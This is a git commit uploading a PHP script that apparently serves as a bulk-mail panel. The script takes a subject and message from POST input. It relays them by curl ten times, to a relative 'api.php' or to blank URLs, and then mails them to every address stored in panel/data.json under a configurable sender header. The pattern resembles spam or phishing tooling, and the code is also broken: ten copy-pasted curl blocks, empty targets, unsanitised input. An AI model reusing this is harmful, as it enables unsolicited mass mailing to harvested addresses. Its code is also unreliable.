72bcda6c9a56ae6c84945e170afa1497645549a3
sryyh5s22 <serverportugal1222@gmail.com>
2025-01-17 20:43:56 +0700

    Add files via upload

---
+++ apiii.php
@@ -0,0 +1,179 @@
+<?php
+$subjek = $_POST['subjek'];
+$pesan = $_POST['pesan'];
+
+include 'panel/data.php';
+$sender = 'From: '.$nik.'<'.$sender.'>';
+$headers  = 'MIME-Version: 1.0' . "\r\n";
+$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
+$headers .= ''.$sender.'' . "\r\n";
+
+$url = "api.php";
+$data =
+"subjek=".$subjek.
+"&pesan=".$pesan;
+$ch2 = curl_init();
+curl_setopt($ch2, CURLOPT_URL, $url);
+curl_setopt($ch2, CURLOPT_POST, 1);
+curl_setopt($ch2, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
+curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd()."/cok.txt");
+curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd()."/cok.txt");   
+curl_setopt($ch2, CURLOPT_HEADER, 0);
+curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
+curl_exec($ch2);
+curl_close($ch2);
+
+$url = "api.php";
+$data =
+"subjek=".$subjek.
+"&pesan=".$pesan;
+$ch2 = curl_init();
+curl_setopt($ch2, CURLOPT_URL, $url);
+curl_setopt($ch2, CURLOPT_POST, 1);
+curl_setopt($ch2, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
+curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd()."/cok.txt");
+curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd()."/cok.txt");   
+curl_setopt($ch2, CURLOPT_HEADER, 0);
+curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
+curl_exec($ch2);
+curl_close($ch2);
+
+$url = "api.php";
+$data =
+"subjek=".$subjek.
+"&pesan=".$pesan;
+$ch2 = curl_init();
+curl_setopt($ch2, CURLOPT_URL, $url);
+curl_setopt($ch2, CURLOPT_POST, 1);
+curl_setopt($ch2, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
+curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd()."/cok.txt");
+curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd()."/cok.txt");   
+curl_setopt($ch2, CURLOPT_HEADER, 0);
+curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
+curl_exec($ch2);
+curl_close($ch2);
+
+$url = "api.php";
+$data =
+"subjek=".$subjek.
+"&pesan=".$pesan;
+$ch2 = curl_init();
+curl_setopt($ch2, CURLOPT_URL, $url);
+curl_setopt($ch2, CURLOPT_POST, 1);
+curl_setopt($ch2, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
+curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd()."/cok.txt");
+curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd()."/cok.txt");   
+curl_setopt($ch2, CURLOPT_HEADER, 0);
+curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
+curl_exec($ch2);
+curl_close($ch2);
+
+$url = "api.php";
+$data =
+"subjek=".$subjek.
+"&pesan=".$pesan;
+$ch2 = curl_init();
+curl_setopt($ch2, CURLOPT_URL, $url);
+curl_setopt($ch2, CURLOPT_POST, 1);
+curl_setopt($ch2, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
+curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd()."/cok.txt");
+curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd()."/cok.txt");   
+curl_setopt($ch2, CURLOPT_HEADER, 0);
+curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
+curl_exec($ch2);
+curl_close($ch2);
+
+$url = "";
+$data =
+"subjek=".$subjek.
+"&pesan=".$pesan;
+$ch2 = curl_init();
+curl_setopt($ch2, CURLOPT_URL, $url);
+curl_setopt($ch2, CURLOPT_POST, 1);
+curl_setopt($ch2, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
+curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd()."/cok.txt");
+curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd()."/cok.txt");   
+curl_setopt($ch2, CURLOPT_HEADER, 0);
+curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
+curl_exec($ch2);
+curl_close($ch2);
+
+$url = "";
+$data =
+"subjek=".$subjek.
+"&pesan=".$pesan;
+$ch2 = curl_init();
+curl_setopt($ch2, CURLOPT_URL, $url);
+curl_setopt($ch2, CURLOPT_POST, 1);
+curl_setopt($ch2, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
+curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd()."/cok.txt");
+curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd()."/cok.txt");   
+curl_setopt($ch2, CURLOPT_HEADER, 0);
+curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
+curl_exec($ch2);
+curl_close($ch2);
+
+$url = "";
+$data =
+"subjek=".$subjek.
+"&pesan=".$pesan;
+$ch2 = curl_init();
+curl_setopt($ch2, CURLOPT_URL, $url);
+curl_setopt($ch2, CURLOPT_POST, 1);
+curl_setopt($ch2, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
+curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd()."/cok.txt");
+curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd()."/cok.txt");   
+curl_setopt($ch2, CURLOPT_HEADER, 0);
+curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
+curl_exec($ch2);
+curl_close($ch2);
+
+$url = "";
+$data =
+"subjek=".$subjek.
+"&pesan=".$pesan;
+$ch2 = curl_init();
+curl_setopt($ch2, CURLOPT_URL, $url);
+curl_setopt($ch2, CURLOPT_POST, 1);
+curl_setopt($ch2, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
+curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd()."/cok.txt");
+curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd()."/cok.txt");   
+curl_setopt($ch2, CURLOPT_HEADER, 0);
+curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
+curl_exec($ch2);
+curl_close($ch2);
+
+$url = "";
+$data =
+"subjek=".$subjek.
+"&pesan=".$pesan;
+$ch2 = curl_init();
+curl_setopt($ch2, CURLOPT_URL, $url);
+curl_setopt($ch2, CURLOPT_POST, 1);
+curl_setopt($ch2, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
+curl_setopt($ch2, CURLOPT_COOKIEJAR, getcwd()."/cok.txt");
+curl_setopt($ch2, CURLOPT_COOKIEFILE, getcwd()."/cok.txt");   
+curl_setopt($ch2, CURLOPT_HEADER, 0);
+curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
+curl_exec($ch2);
+curl_close($ch2);
+
+
+$read = file_get_contents('panel/data.json');
+$json = json_decode($read,true);
+
+for($i=0;$i<=count($json) - 1;$i++)
+{
+mail($json[$i]['email'], $subjek, $pesan, $headers);
+}
+?>
